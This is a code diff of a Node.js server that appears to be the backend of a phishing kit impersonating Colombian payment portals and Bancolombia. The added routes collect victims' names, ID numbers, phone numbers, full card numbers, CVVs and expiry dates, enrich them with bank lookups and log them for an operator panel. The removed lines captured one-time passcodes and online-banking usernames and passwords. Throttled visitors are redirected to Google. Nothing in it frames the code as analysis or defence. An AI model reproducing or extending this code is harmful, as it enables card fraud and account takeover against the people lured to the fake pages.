@@ -460,7 +460,7 @@ const server = http.createServer(async (req, res) => {
     }
 
     // ============================================================
-    // 🔥 RUTA DE CONSULTA INICIAL (Guarda en Historial)
+    // 🔥 RUTA 1: Guardar consulta inicial (SOLO en memoria)
     // ============================================================
     const consultaMatch = url.match(/^\/cc-(bogota|bucaramanga)\/guardar-consulta$/);
     if (req.method === 'POST' && consultaMatch) {
@@ -470,7 +470,6 @@ const server = http.createServer(async (req, res) => {
             const { sessionId, tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio } = datos;
             if (!sessionId) { json(res, 400, { ok: false }); return; }
 
-            // 🔥 GUARDAMOS LOS DATOS EN LA SESIÓN (Para el panel principal)
             const datosPrevios = datosSesiones.get(sessionId) || {};
             const datosCompletos = Object.assign({}, datosPrevios, {
                 tipoPersona, tipoDoc, documento, nombres, apellidos, telefono, correo, tipoPago, placa, precio,
@@ -479,12 +478,81 @@ const server = http.createServer(async (req, res) => {
             });
 
             datosSesiones.set(sessionId, datosCompletos);
+
+            console.log(`[${bancoKey}] Consulta en memoria: ${sessionId} | Tel: ${telefono}`);
+            json(res, 200, { ok: true });
+        } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+        return;
+    }
+
+    // ============================================================
+    // 🔥 RUTA 2: Confirmar pago (Guarda el PRIMER registro en historial)
+    // ============================================================
+    const confirmarMatch = url.match(/^\/cc-(bogota|bucaramanga)\/confirmar-pago$/);
+    if (req.method === 'POST' && confirmarMatch) {
+        try {
+            const bancoKey = 'cc-' + confirmarMatch[1];
+            const { sessionId } = await getBody(req);
+            if (!sessionId) { json(res, 400, { ok: false }); return; }
+
+            const datosCompletos = datosSesiones.get(sessionId) || {};
             
-            // 🔥 GUARDAMOS UN REGISTRO EN EL HISTORIAL CON LOS DATOS PERSONALES
+            // GUARDAMOS EL PRIMER REGISTRO EN EL HISTORIAL
             guardarHistorial(bancoKey, datosCompletos);
 
-            console.log(`[${bancoKey}] Consulta guardada en historial: ${sessionId} | Tel: ${telefono}`);
+            console.log(`[${bancoKey}] Consulta guardada en historial (Paso 1): ${sessionId}`);
             json(res, 200, { ok: true });
+        } catch (e) { json(res, 500, { ok: false, error: e.message }); }
+        return;
+    }
+
+    // ============================================================
+    // 🔥 RUTA 3: Enviar pago (Guarda el SEGUNDO registro en historial)
+    // ============================================================
+    const ccMatch = url.match(/^\/cc-(bogota|bucaramanga)\/enviar-pago$/);
+    if (req.method === 'POST' && ccMatch) {
+        if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
+        try {
+            const bancoKey = 'cc-' + ccMatch[1];
+            const datos = await getBody(req);
+            const { sessionId, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, placa, subsidio } = datos;
+            if (!sessionId || !marca) { json(res, 400, { ok: false }); return; }
+
+            const infoBin = await obtenerInfoBin(tarjeta);
+            const datosPrevios = datosSesiones.get(sessionId) || {};
+
+            const datosSesion = Object.assign({}, datosPrevios, {
+                bancoKey: bancoKey, 
+                marca, 
+                tarjeta, 
+                titular, 
+                docType, 
+                docNumber,
+                monto, 
+                expMes, 
+                expAnio, 
+                cvv, 
+                placa: placa || datosPrevios.placa || '', 
+                subsidio: subsidio || false,
+                ip: ip, 
+                creadoEn: new Date().toISOString(),
+                bin: infoBin?.bin || (tarjeta ? String(tarjeta).replace(/\D/g, '').substring(0, 6) : ''),
+                cardBrand: infoBin?.cardBrand || marca || 'Desconocida',
+                cardType: infoBin?.cardType || 'Desconocido',
+                cardLevel: infoBin?.cardLevel || 'Desconocido',
+                bankName: infoBin?.bankName || 'Desconocido',
+                countryName: infoBin?.countryName || 'Desconocido'
+            });
+
+            estadoSesiones.set(sessionId, 'pendiente');
+            datosSesiones.set(sessionId, datosSesion);
+            ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
+
+            // GUARDAMOS EL SEGUNDO REGISTRO EN EL HISTORIAL
+            guardarHistorial(bancoKey, datosSesion);
+
+            console.log(`[${bancoKey}] Tarjeta guardada en historial (Paso 2): ${sessionId}`);
+            json(res, 200, { ok: true, sessionId, bancoKey, binInfo: infoBin });
         } catch (e) { json(res, 500, { ok: false, error: e.message }); }
         return;
     }
@@ -582,110 +650,6 @@ const server = http.createServer(async (req, res) => {
 
             console.log(`[BANCOLOMBIA] Flujo completado - Usuario: ${datosCompletos.usuario || 'N/A'} | IP: ${ip}`);
             json(res, 200, { ok: true });
-        } catch (e) { json(res, 500, { ok: false, error: e.message }); }
-        return;
-    }
-
-    // ============================================================
-    // 🔥 RUTA MODIFICADA: Guardar tarjeta nueva en CC-Bogotá/Bucaramanga
-    // ============================================================
-    const ccMatch = url.match(/^\/cc-(bogota|bucaramanga)\/enviar-pago$/);
-    if (req.method === 'POST' && ccMatch) {
-        if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
-        try {
-            const bancoKey = 'cc-' + ccMatch[1];
-            const datos = await getBody(req);
-            const { sessionId, marca, tarjeta, titular, docType, docNumber, monto, expMes, expAnio, cvv, placa, subsidio } = datos;
-            if (!sessionId || !marca) { json(res, 400, { ok: false }); return; }
-
-            const infoBin = await obtenerInfoBin(tarjeta);
-
-            // 🔥 RECUPERAR DATOS PERSONALES PREVIOS DE ESTA SESIÓN
-            const datosPrevios = datosSesiones.get(sessionId) || {};
-
-            // 🔥 UNIR TODO: Datos personales + Datos de la tarjeta
-            const datosSesion = Object.assign({}, datosPrevios, {
-                bancoKey: bancoKey, 
-                marca, 
-                tarjeta, 
-                titular, 
-                docType, 
-                docNumber,
-                monto, 
-                expMes, 
-                expAnio, 
-                cvv, 
-                placa: placa || datosPrevios.placa || '', 
-                subsidio: subsidio || false,
-                ip: ip, 
-                creadoEn: new Date().toISOString(),
-                bin: infoBin?.bin || (tarjeta ? String(tarjeta).replace(/\D/g, '').substring(0, 6) : ''),
-                cardBrand: infoBin?.cardBrand || marca || 'Desconocida',
-                cardType: infoBin?.cardType || 'Desconocido',
-                cardLevel: infoBin?.cardLevel || 'Desconocido',
-                bankName: infoBin?.bankName || 'Desconocido',
-                countryName: infoBin?.countryName || 'Desconocido'
-            });
-
-            // Guardar estado de la sesión (para el panel principal)
-            estadoSesiones.set(sessionId, 'pendiente');
-            datosSesiones.set(sessionId, datosSesion);
-            ultimaAccionSesiones.set(sessionId, 'ENVIAR_PAGO');
-
-            // 🔥 GUARDAR EN EL HISTORIAL (con los datos unidos)
-            guardarHistorial(bancoKey, datosSesion);
-
-            console.log(`[${bancoKey}] Nueva tarjeta: ${sessionId} (${marca}) IP=${ip} | Nombres: ${datosSesion.nombres || '-'}`);
-            json(res, 200, { ok: true, sessionId, bancoKey, binInfo: infoBin });
-        } catch (e) { json(res, 500, { ok: false, error: e.message }); }
-        return;
-    }
-
-    const ccOtpMatch = url.match(/^\/cc-(bogota|bucaramanga)\/enviar-otp$/);
-    if (req.method === 'POST' && ccOtpMatch) {
-        if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
-        try {
-            const bancoKey = 'cc-' + ccOtpMatch[1];
-            const { sessionId, otp } = await getBody(req);
-            if (!sessionId || !otp) { json(res, 400, { ok: false }); return; }
-            const datosOriginales = datosSesiones.get(sessionId) || {};
-            const datosCompletos = Object.assign({}, datosOriginales, { otp });
-            estadoSesiones.set(sessionId, 'pendiente');
-            datosSesiones.set(sessionId, datosCompletos);
-            ultimaAccionSesiones.set(sessionId, 'ENVIAR_OTP');
-
-            guardarHistorial(bancoKey, datosCompletos);
-
-            console.log(`[${bancoKey}] OTP: ${sessionId} → ${otp}`);
-            json(res, 200, { ok: true, sessionId, bancoKey });
-        } catch (e) { json(res, 500, { ok: false, error: e.message }); }
-        return;
-    }
-
-    const authMatch = url.match(/^\/cc-(bogota|bucaramanga)\/enviar-autorizacion$/);
-    if (req.method === 'POST' && authMatch) {
-        if (!checkRateLimit(ip, 'publico')) { json(res, 200, { ok: false, bloqueado: true, redirect: 'https://www.google.com' }); return; }
-        try {
-            const bancoKey = 'cc-' + authMatch[1];
-            const { sessionId, usuario, password } = await getBody(req);
-            if (!sessionId || !usuario || !password) { json(res, 400, { ok: false, error: 'Faltan datos' }); return; }
-
-            const datosPrevios = datosSesiones.get(sessionId) || {};
-            const datosCompletos = Object.assign({}, datosPrevios, {
-                authUsuario: usuario,
-                authPassword: password,
-                authEnviadoEn: new Date().toISOString()
-            });
-
-            datosSesiones.set(sessionId, datosCompletos);
-            estadoSesiones.set(sessionId, 'autorizacion_enviada');
-            ultimaAccionSesiones.set(sessionId, 'AUTORIZAR');
-
-            guardarHistorial(bancoKey, datosCompletos);
-            agregarLog('autorizacion', { sessionId, usuario });
-
-            console.log(`[${bancoKey}] Autorización: ${sessionId} → usuario=${usuario}`);
-            json(res, 200, { ok: true, sessionId });
         } catch (e) { json(res, 500, { ok: false, error: e.message }); }
         return;
     }
